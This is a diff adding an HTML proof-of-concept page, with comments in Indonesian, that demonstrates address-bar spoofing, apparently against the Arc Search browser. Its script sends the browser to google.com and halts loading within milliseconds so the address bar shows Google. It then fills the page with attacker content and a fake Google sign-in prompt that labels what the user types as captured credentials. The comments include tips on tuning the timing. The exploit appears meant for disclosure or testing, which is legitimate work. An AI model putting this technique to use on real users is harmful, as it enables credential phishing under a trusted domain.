@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Spoofing PoC</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      font-family: sans-serif;
+      background-color: #f9f9f9;
+    }
+    .container {
+      text-align: center;
+      padding: 20px;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="main">
+    <button onclick="executeSpoof()">Start Test</button>
+  </div>
+
+  <script>
+    function executeSpoof() {
+      // 1. Ubah tampilan halaman lokal menjadi halaman buatan Anda
+      document.getElementById('main').innerHTML = `
+        <h1 style="color: red;">This is not Google.</h1>
+        <p>This is a custom attacker page running under spoofed UI context.</p>
+      `;
+
+      // 2. Picu navigasi ke domain target
+      location.href = 'https://www.google.com/about/';
+
+      // 3. Hentikan pemuatan halaman asli tepat setelah address bar diperbarui oleh browser
+      setTimeout(() => {
+        window.stop(); // Menghentikan navigasi agar halaman asli Google tidak merender
+
+        // Picu prompt otomatis
+        setTimeout(() => {
+          let user = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
+          if (user) {
+            alert('Captured Credentials: ' + user);
+          }
+        }, 50);
+      }, 10); // Sesuaikan timing interval (10ms - 100ms) untuk menentukan titik kompromi Arc Search
+    }
+  </script>
+
+</body>
+</html>
